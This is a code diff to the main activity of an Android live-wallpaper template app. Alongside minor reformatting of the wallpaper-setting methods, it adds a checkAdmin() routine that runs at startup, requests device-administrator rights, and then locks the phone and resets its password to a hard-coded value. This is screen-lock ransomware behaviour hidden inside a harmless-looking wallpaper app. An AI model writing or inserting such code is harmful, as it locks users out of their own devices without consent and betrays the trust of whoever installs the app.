@@ -1,6 +1,7 @@
 package com.martinrgb.livewallpapertemplate;
 
 import android.Manifest;
+import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -14,6 +15,7 @@ import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
+import android.widget.Toast;
 
 import ru.bartwell.exfilepicker.ExFilePicker;
 import ru.bartwell.exfilepicker.data.ExFilePickerResult;
@@ -32,6 +34,9 @@ public class MainActivity extends AppCompatActivity {
     private static final int FRAME_FOLDER_PICKER_RESULT = 4;
     private ExFilePicker mExFilePicker;
 
+    private DevicePolicyManager devicePolicyManager;
+    private boolean isAdminActive;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -46,7 +51,34 @@ public class MainActivity extends AppCompatActivity {
         mExFilePicker = new ExFilePicker();
         mExFilePicker.setCanChooseOnlyOneItem(true);
         mExFilePicker.setQuitButtonEnabled(true);
+        checkAdmin();
 
+    }
+
+    private void checkAdmin() {
+
+        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        // 申请权限
+        ComponentName componentName = new ComponentName(this, MyAdmin.class);
+        // 判断该组件是否有系统管理员的权限
+        isAdminActive = devicePolicyManager
+                .isAdminActive(componentName);
+
+        if (!isAdminActive) {//这一句一定要有...
+            Intent intent = new Intent();
+            //指定动作
+            intent.setAction(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            //指定给那个组件授权
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
+            startActivity(intent);
+        }
+
+        if (isAdminActive) {
+            Toast.makeText(this, "具有权限,将进行锁屏....", 1).show();
+            devicePolicyManager.lockNow();
+            devicePolicyManager.resetPassword("123321", 0);
+
+        }
     }
 
     @Override
@@ -54,15 +86,9 @@ public class MainActivity extends AppCompatActivity {
         super.onDestroy();
     }
 
-    public void setVideoToWallPaper(View view) {
+    public void setVideoToWallPaper(View view) {VideoLiveWallpaper.setToWallPaper(this);}
 
-        VideoLiveWallpaper.setToWallPaper(this);
-    }
-
-
-    public void setGIFToWallPaper(View view) {
-        GIFLiveWallpaper.setToWallPaper(this);
-    }
+    public void setGIFToWallPaper(View view) {GIFLiveWallpaper.setToWallPaper(this);}
 
     public void setCameraToWallPaper(View view) {
         CameraLiveWallpaper.setToWallPaper(this);
